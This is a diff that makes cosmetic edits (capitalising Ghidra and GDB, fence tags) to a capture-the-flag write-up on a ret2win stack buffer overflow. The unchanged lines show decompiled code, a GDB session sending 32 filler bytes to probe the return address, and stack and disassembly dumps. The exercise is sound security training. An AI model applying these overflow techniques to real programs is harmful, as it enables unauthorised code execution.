@@ -19,7 +19,7 @@ Exiting
 
 ## Static analysis
 
-Using ghidra we can find those functions :
+Using Ghidra we can find those functions :
 
 ```C
 undefined8 main(void)
@@ -64,14 +64,14 @@ Let's exploit this to redirect the program towards `ret2win()`.
 
 ## Dynamic Analysis
 
-Using gdb, we'll find out how many bytes we need to send to modify the return address.  
+Using GDB, we'll find out how many bytes we need to send to modify the return address.  
 
 Let's take a look at the stack right after we've send 32 bytes (the size of `local_28`) :
 
-```gdb
+```GDB
 gef➤  r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32)')
 ```
-``` gdb
+``` GDB
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
 0x00007fffffffda20│+0x0000: 0x4141414141414141	 ← $rsp, $rsi
 0x00007fffffffda28│+0x0008: 0x4141414141414141
@@ -136,9 +136,9 @@ Thank you!
 Well done! Here's your flag:
 ```
 
-We're reaching the `ret2win()` function, but the program isn't giving us the flag. Let's take a look with gdb :
+We're reaching the `ret2win()` function, but the program isn't giving us the flag. Let's take a look with GDB :
 
-```gdb
+```GDB
 ───────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
    0x7f76f9e825f4 <do_system+0144> mov    QWORD PTR [rsp+0x60], r12
    0x7f76f9e825f9 <do_system+0149> mov    r9, QWORD PTR [rax]
